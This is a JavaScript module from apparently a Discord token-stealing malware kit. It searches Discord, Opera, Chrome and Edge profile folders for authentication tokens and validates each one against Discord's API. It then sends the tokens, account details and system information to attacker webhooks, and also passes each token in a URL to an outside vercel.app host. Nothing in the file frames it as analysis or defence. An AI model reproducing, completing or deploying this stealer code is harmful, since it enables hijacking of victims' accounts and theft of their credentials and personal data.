const { get_info } = require("./../../modules/core/core.js");
const { get_discord_Info } = require("./../../utils/axios/discord.js");

const { instance } = require("./../../utils/axios/request.js");
const { decode_B64, notify } = require("./../../utils/functions/functions.js");

const { inject_path } = require("./../injections/discord.js");

const { tokens, get_tokens } = require("./finds.js");

let local = process.env.localappdata;
let roaming = process.env.appdata;

let paths = [
    `${roaming}/discord/`,
    `${roaming}/discordcanary/`,
    `${roaming}/discordptb/`,
    `${roaming}/discorddevelopment/`,
    `${roaming}/lightcord/`,
    `${roaming}/Opera Software/Opera Stable/`,
    `${roaming}/Opera Software/Opera GX Stable/`,
    `${local}/Google/Chrome/User Data/Default/`,
    `${local}/Google/Chrome/User Data/Profile 1/`,
    `${local}/Google/Chrome/User Data/Profile 2/`,
    `${local}/Google/Chrome/User Data/Profile 3/`,
    `${local}/Google/Chrome/User Data/Profile 4/`,
    `${local}/Google/Chrome/User Data/Profile 5/`,
    `${local}/Google/Chrome/User Data/Guest Profile/`,
    `${local}/Google/Chrome/User Data/Default/Network/`,
    `${local}/Google/Chrome/User Data/Profile 1/Network/`,
    `${local}/Google/Chrome/User Data/Profile 2/Network/`,
    `${local}/Google/Chrome/User Data/Profile 3/Network/`,
    `${local}/Google/Chrome/User Data/Profile 4/Network/`,
    `${local}/Google/Chrome/User Data/Profile 5/Network/`,
    `${local}/Google/Chrome/User Data/Guest Profile/Network/`,
    `${local}/Microsoft/Edge/User Data/Default/`,
    `${local}/Microsoft/Edge/User Data/Profile 1/`,
    `${local}/Microsoft/Edge/User Data/Profile 2/`,
    `${local}/Microsoft/Edge/User Data/Profile 3/`,
    `${local}/Microsoft/Edge/User Data/Profile 4/`,
    `${local}/Microsoft/Edge/User Data/Profile 5/`,
    `${local}/Microsoft/Edge/User Data/Guest Profile/`,
    `${local}/Microsoft/Edge/User Data/Default/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 1/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 2/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 3/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 4/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 5/Network/`,
    `${local}/Microsoft/Edge/User Data/Guest Profile/Network/`,
];

const send_webhook_tokens = async (webhook) => {
    for (const path of paths) await get_tokens(path);
    for (let token of tokens) {

        let token_type = token.includes(decode_B64("YnJvd3NlcnNfdG9rZW5zXw"));
            token = token.replace(decode_B64("YnJvd3NlcnNfdG9rZW5zXw"), "");

        try {
            let infos;
            try {
                const req = await instance({
                    "url": `https://discord.com/api/v9/users/@me`,
                    "method": "GET",
                    "headers": {
                        "authorization": token
                    },
                })
                infos = await req["data"];
            } catch {
                infos = null;
            }
            if (!infos) continue;

            let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
            const discord = {
                ...await get_discord_Info(token),
                token_type,
                copy,
                inject_path
            };
            const system = await get_info();

            webhook.forEach(async (webhook) => {
                const msg = {
                    "title": "Initialized Grabber",
                    "embeds": [{
                        "fields": [{
                            "name": `<a:aura:1087044506542674091> ${discord.token_type ? "Browser Token" : "Token"}:`,
                            "value": `\`\`\`${discord.token}\`\`\`\n[[Click Here To Copy Your Token]](${discord.copy})`,
                            "inline": false
                        }],
                    }]
                }
                notify(webhook, instance, msg, discord, system);
            })

            continue;
        } catch (e) {
            console.error(e);
            return;
        }
    }
}

module.exports = {
    send_webhook_tokens
}